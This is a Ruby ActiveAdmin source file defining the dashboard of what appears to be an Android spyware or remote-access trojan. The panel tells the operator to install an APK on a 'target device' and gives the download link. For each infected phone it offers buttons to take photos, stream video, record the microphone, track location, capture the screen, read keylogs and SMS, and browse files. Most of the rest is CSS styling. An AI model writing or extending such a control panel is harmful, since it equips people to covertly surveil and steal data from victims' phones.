ActiveAdmin.register_page "Dashboard" do
  menu priority: 1, label: "🚀 Command Center"

  content title: "🚀 Device Command Center" do
    
    # 1. Connected Devices Grid
    devices = Smartphone.joins(:apk_installation)
                       .where("apk_installations.status = ?", "installed")
    
    if devices.empty?
      div class: "empty-state" do
        h2 "Waiting for Devices..."
        para "Install the APK on a target device to see it here."
        para "APK Download URL: http://#{request.host}:#{request.port}/app-release.apk", class: "apk-link"
      end
    else
      div class: "device-grid" do
        devices.each do |device|
          panel "", class: "device-card" do
            # Device Header
            div class: "device-header" do
              div class: "device-icon" do
                text_node "📱"
              end
              div class: "device-details" do
                h3 device.name || "Unknown Device"
                span device.operating_system, class: "device-os"
                status_badge "🟢 Online", class: "status-online"
              end
            end

            # Quick Actions Grid
            div class: "control-grid" do
              # Camera
              link_to take_picture_smartphones_path(device_id: device.id), method: :post, remote: true, class: "control-btn camera" do
                span "📷", class: "icon"
                span "Take Photo", class: "label"
              end

              # Live Video
              link_to admin_live_streaming_path(device_id: device.id), class: "control-btn video" do
                span "📹", class: "icon"
                span "Live Video", class: "label"
              end

              # Record Audio
              link_to microphone_rec_recordings_path(device_id: device.id, duration: 10), method: :post, remote: true, class: "control-btn audio" do
                span "🎤", class: "icon"
                span "Record Mic", class: "label"
              end

              # Location
              link_to dump_location_geo_locations_path(device_id: device.id), remote: true, class: "control-btn location" do
                span "📍", class: "icon"
                span "Location", class: "label"
              end
              
              # Screen Capture
              link_to dump_screen_snap_screenshots_path(device_id: device.id), remote: true, class: "control-btn screen" do
                 span "🖥️", class: "icon"
                 span "Screenshot", class: "label"
              end

              # Keylogs
              link_to admin_keylogs_path(q: { smartphone_id_eq: device.id }), class: "control-btn keylogs" do
                span "⌨️", class: "icon"
                span "Keylogs", class: "label"
              end

              # SMS
              link_to admin_sms_messages_path(q: { smartphone_id_eq: device.id }), class: "control-btn sms" do
                span "💬", class: "icon"
                span "SMS", class: "label"
              end

              # Files / More
              link_to admin_remote_path(device_id: device.id), class: "control-btn files" do
                span "📂", class: "icon"
                span "More...", class: "label"
              end
            end
          end
        end
      end
    end

    # CSS Styles for Command Center
    text_node (<<~CSS).html_safe
      <style>
      .empty-state {
        text-align: center;
        padding: 50px;
        color: #8b949e;
      }
      .apk-link {
        font-family: monospace;
        background: #161b22;
        padding: 10px;
        border-radius: 5px;
        margin-top: 10px;
        display: inline-block;
      }

      .device-grid {
        display: grid;
        grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
        gap: 20px;
        padding: 20px 0;
      }

      .device-card {
        background: linear-gradient(145deg, #1e1e2f, #27293d);
        border: 1px solid #30363d;
        border-radius: 15px;
        overflow: hidden;
        transition: transform 0.2s;
      }
      .device-card:hover {
        transform: translateY(-5px);
        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
      }
      
      .device-card .panel_contents {
        padding: 0 !important;
      }

      .device-header {
        display: flex;
        align-items: center;
        padding: 20px;
        background: rgba(0,0,0,0.2);
        border-bottom: 1px solid #30363d;
      }

      .device-icon {
        font-size: 40px;
        margin-right: 15px;
        background: rgba(255,255,255,0.1);
        width: 60px;
        height: 60px;
        display: flex;
        align-items: center;
        justify-content: center;
        border-radius: 50%;
      }

      .device-details h3 {
        margin: 0 0 5px 0;
        color: white;
        font-size: 18px;
      }

      .device-os {
        display: block;
        color: #8b949e;
        font-size: 12px;
        margin-bottom: 5px;
      }

      .control-grid {
        display: grid;
        grid-template-columns: repeat(4, 1fr);
        gap: 1px;
        background: #30363d; /* Gap color */
      }

      .control-btn {
        background: #27293d;
        color: #c9d1d9;
        text-decoration: none;
        padding: 20px 10px;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        transition: background 0.2s, color 0.2s;
        border: none;
        height: 100px;
      }

      .control-btn:hover {
        background: #667eea;
        color: white;
        text-decoration: none;
      }

      .control-btn .icon {
        font-size: 24px;
        margin-bottom: 8px;
      }

      .control-btn .label {
        font-size: 12px;
        font-weight: 500;
      }
      
      /* Specific Button Colors on Hover */
      .control-btn.camera:hover { background: #f5576c; } /* Red/Pink */
      .control-btn.video:hover { background: #f093fb; } /* Purple */
      .control-btn.audio:hover { background: #4facfe; } /* Blue */
      .control-btn.location:hover { background: #43e97b; } /* Green */
      .control-btn.keylogs:hover { background: #ff9a9e; } /* Peach/Pink */
      .control-btn.sms:hover { background: #ffecd2; color: #333 !important; } /* Light Orange */

      </style>
    CSS
  end
end
